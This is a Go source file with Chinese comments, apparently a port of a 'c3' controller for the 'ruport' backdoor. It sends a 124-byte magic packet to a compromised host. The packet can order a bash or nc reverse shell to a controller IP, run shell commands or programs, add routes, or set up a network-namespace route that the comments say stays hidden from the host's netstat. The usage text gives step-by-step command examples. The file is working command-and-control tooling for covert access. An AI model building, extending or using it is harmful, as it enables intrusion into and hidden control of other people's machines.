// c3 指令发送端：向 ruport 被控端发送 124 字节魔术指令包，
// 用法与原 ruport 项目 insTool/c3.py 完全一致。
package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"
)

const extBufLen = 100

// insInfo 对应 c3.py 的 insinfo 字典。
type insInfo struct {
	ins  int
	del  bool
	ip   string // 控制服务器地址
	port int    // 控制服务器端口
	p1   int    // 被控端实际执行任务的端口（出网端口）
	p2   int    // 功能端口
	ext  string // 扩展数据
}

var useinfo = `
**************************************************
工具说明：
**************************************************

控制端需要给被控端发送特定的指令来激活被控端的功能。
发送的数据主要为以下格式：(固定长度124个字节)
---------------------------------------------------------------------------
|  2  |  2  |      8       |  2  |   4   |  2  |  2  |  2  |     100      |
---------------------------------------------------------------------------
|<--------flag------------>| ins |--cip--|port | p1  | p2  |     ext      |

flag:   标记，被控端通过次标记来识别网络流是否属于控制端的指令。
        一共12个字节固定大小 a² + b² = c²， 表数据各种中存储的
        数据为a|b|c²

ins:    指令， 通过不同的指令实现对被控端的功能控制, 指令格式如下：
        -----------
        | 8  | 8  |
        -----------
        | H  | L  |

        指令分为2个字节，高字节和低字节。
        低字节(L): 低字节主要用于控制功能,如下：（十六进制数据表示)
            01: 只添加路由功能
            02: 反弹连接
            03: 执行shell命令
            04: 执行程序
        高字节(H): 目前高字节的数据没有特别具体的使用，不为空的情况下
            会删除

        指令：
        01: 只添加路由
        02: 反弹连接
            目前支持的反弹连接: bash和nc反弹
            自发送这个指令的时候，ext 扩展段必须指定是bash还是nc
        03: 执行shell命令
        04: 执行程序

cip:    控制服务器IP(必须)(网络字节序)
port:   控制服务器端口(必须)(网络字节序)
p1:     出网端口(必须)
p2:     功能端口(被控端实际与控制端通讯的本地程序功能端口)

整体的指令信息的长度为123个字节.

**************************************************
命令行：
**************************************************

-h:     帮助信息
-t:     目标地址
-p:     端口
-S:     控制服务器地址
-P:     控制服务器端口

-x:     对应p1
-y:     对应p2
-e:     对应扩展(ext)
-i:     指令(01, 02, 03, 04) 都是用十六进制的数据形式表示
-d:     删除操作(指令字段高位置1)
-1:     同 -i 01 路由
-2:     同 -i 02 反弹
-3:     同 -i 03 执行shell命令
-4:     同 -i 04 执行程序
-5:     同 -i 05 netns隐藏路由(ext指定ns内服务命令，仅ruport-go支持)


**************************************************
示例:
**************************************************
1.  c3 -t 192.168.1.2   -p 80      -1       -S 192.168.1.3    -P 3333    -x 80
       | 目标地址    |   |端口| |路由指令|   | 控制端IP      | |控制端口||被控端出网端口|
    // 发送 路由 指令到192.168.1.2的80端口，并指定控制服务器的IP为192.168.1.3 控制端口为：3333 被控端出网端口 80

2.  c3 -t 192.168.1.2  -p 80      -2       -S 192.168.1.3  -P 2222    -x 80         -e bash
       | 目标地址    | |端口 |   |反弹指令| | 控制端IP     | |控制端口||被控端出网端口| |扩展数据|
    // 发送 bash反弹 指令到192.168.1.2的80端口，并指定控制服务器的IP为192.168.1.3 控制端口为：2222 被控制出网端口 80

3.  c3 -t 192.168.1.2  -p 80    -d       -1       -S 192.168.1.3  -P 3333     -x 80
       | 目标程序    | |端口 |  |删除|   |路由指令| |控制端IP      | |控制端口||被控出网端口|

    // 发送 删除路由 指令到192.168.1.2的80端口，并指定控制服务器的IP为192.168.1.3 控制端口为: 3333 被控出网端口为 80

4.  c3 -t 192.168.1.2 -p 80 -1 -S 192.168.1.3 -P 3333
    // 如果没有 -x 80 指定出网的端口，那么通讯用端口就是 -p 80 这个指定的端口

5.  c3 -t 192.168.1.2 -p 80 -1 -S 192.168.1.3 -P 12345 -x 80 -y 22
    // 给被控制端添加路由，注意：必须指定出网端口(-x)和被控端本地端口(-y)

6.  c3 -t 192.168.1.2 -p 80 -5 -S 192.168.1.3 -P 3333 -x 80 -y 22 -e "sshd -D -p 22"
    // netns隐藏路由：被控端在独立网络命名空间内拉起服务并转发，
    // 宿主netstat不显示该连接；-e为ns内服务命令（可省略，前提ns内已有服务）

**************************************************
附加：
**************************************************
1. ssh 通过nc代理连接
	ssh -o ProxyCommand='ncat -x 127.0.0.1:1081 -p 12345 %h %p ' username@192.168.1.2 -p 80 
    // ssh通过ncat的代理连接远程服务器的80端口，并且通过-p来指定ncat出网的端口
`

func usage() {
	fmt.Print(useinfo)
}

func printMsg(info *insInfo) {
	if info.ins == 0x01 {
		log.Print("成功发送指令:    路由")
	} else if info.ins == 0x02 {
		log.Print("成功发送指令:    反弹指令")
	} else if info.ins == 0x03 {
		log.Print("成功发送指令:    执行shell命令")
	} else if info.ins == 0x04 {
		log.Print("成功发送指令:    执行程序")
	} else if info.ins == 0x05 {
		log.Print("成功发送指令:    netns隐藏路由")
	}
}

// wrapInsInfo 打包数据，等价于 c3.py 的 wrapInsInfo()。
func wrapInsInfo(info *insInfo) []byte {
	result := make([]byte, 124)

	// 生成特征串
	s1 := uint16(1 + 2*rand.Intn(32767)) // 奇数 1..65533，对应 random.randrange(1, 65535, 2)
	s2 := uint16(1 + 2*rand.Intn(32767))
	s3 := uint64(s1)*uint64(s1) + uint64(s2)*uint64(s2)
	binary.LittleEndian.PutUint16(result[0:2], s1)
	binary.LittleEndian.PutUint16(result[2:4], s2)
	binary.LittleEndian.PutUint64(result[4:12], s3)

	// 指令
	result[12] = byte(info.ins & 0xff)
	if info.del {
		result[13] = 0x01
	} else {
		result[13] = 0x00
	}

	// 控制IP/Port（网络字节序）
	if ip := net.ParseIP(info.ip); ip != nil {
		if ip4 := ip.To4(); ip4 != nil {
			copy(result[14:18], ip4)
		}
	}
	if info.port > 0 && info.port < 65535 {
		binary.BigEndian.PutUint16(result[18:20], uint16(info.port))
	}

	// p1 出网端口
	if info.p1 > 0 && info.p1 < 65535 {
		binary.BigEndian.PutUint16(result[20:22], uint16(info.p1))
	}
	// p2 服务端口
	if info.p2 > 0 && info.p2 < 65535 {
		binary.BigEndian.PutUint16(result[22:24], uint16(info.p2))
	}

	// ext 扩展
	if len(info.ext) > 0 {
		copy(result[24:], info.ext)
	}

	return result
}

// sendmsg 等价于 c3.py 的 sendmsg()：5 秒超时连接并发送全部数据。
func sendmsg(target string, srvport int, data []byte) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(target, strconv.Itoa(srvport)), 5*time.Second)
	if err != nil {
		fmt.Printf("Caught exception socket.error : %s\n", err)
		return false
	}
	defer conn.Close()

	_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write(data); err != nil {
		fmt.Printf("Caught exception socket.error : %s\n", err)
		return false
	}
	return true
}

func main() {
	log.SetOutput(os.Stdout)

	info := &insInfo{}
	var (
		target     string
		targetPort int
	)

	flag.StringVar(&target, "t", "", "目标地址")
	flag.IntVar(&targetPort, "p", 0, "端口")
	flag.BoolVar(&info.del, "d", false, "删除操作(指令字段高位置1)")
	insHex := flag.String("i", "", "指令(01, 02, 03, 04) 十六进制表示")
	flag.Bool("1", false, "同 -i 01 路由")
	flag.Bool("2", false, "同 -i 02 反弹")
	flag.Bool("3", false, "同 -i 03 执行shell命令")
	flag.Bool("4", false, "同 -i 04 执行程序")
	flag.Bool("5", false, "同 -i 05 netns隐藏路由")
	flag.StringVar(&info.ip, "S", "", "控制服务器地址")
	flag.IntVar(&info.port, "P", 0, "控制服务器端口")
	flag.IntVar(&info.p1, "x", 0, "出网端口(p1)")
	flag.IntVar(&info.p2, "y", 0, "功能端口(p2)")
	flag.StringVar(&info.ext, "e", "", "扩展数据(ext)")
	flag.Usage = usage

	flag.Parse()

	if flag.NFlag() == 0 && flag.NArg() == 0 {
		usage()
		os.Exit(0)
	}

	// 快捷指令
	flag.Visit(func(f *flag.Flag) {
		switch f.Name {
		case "1":
			info.ins = 0x01
		case "2":
			info.ins = 0x02
		case "3":
			info.ins = 0x03
		case "4":
			info.ins = 0x04
		case "5":
			info.ins = 0x05
		}
	})

	// -i 为十六进制指令（显式给出时优先于快捷指令）
	if *insHex != "" {
		v, err := strconv.ParseUint(*insHex, 16, 32)
		if err != nil {
			fmt.Println("Error")
			os.Exit(1)
		}
		info.ins = int(v)
	}

	if info.p1 == 0 {
		info.p1 = targetPort
	}

	if info.ins&0x00ff == 0x01 || info.ins&0x00ff == 0x05 {
		if info.p2 == 0 {
			fmt.Println("添加路由功能必须指定p2参数.")
			os.Exit(1)
		}
	}

	content := wrapInsInfo(info)
	if len(content) > 0 {
		if sendmsg(target, targetPort, content) {
			printMsg(info)
		} else {
			log.Print("发送启动指令失败.")
			os.Exit(1)
		}
	}
}
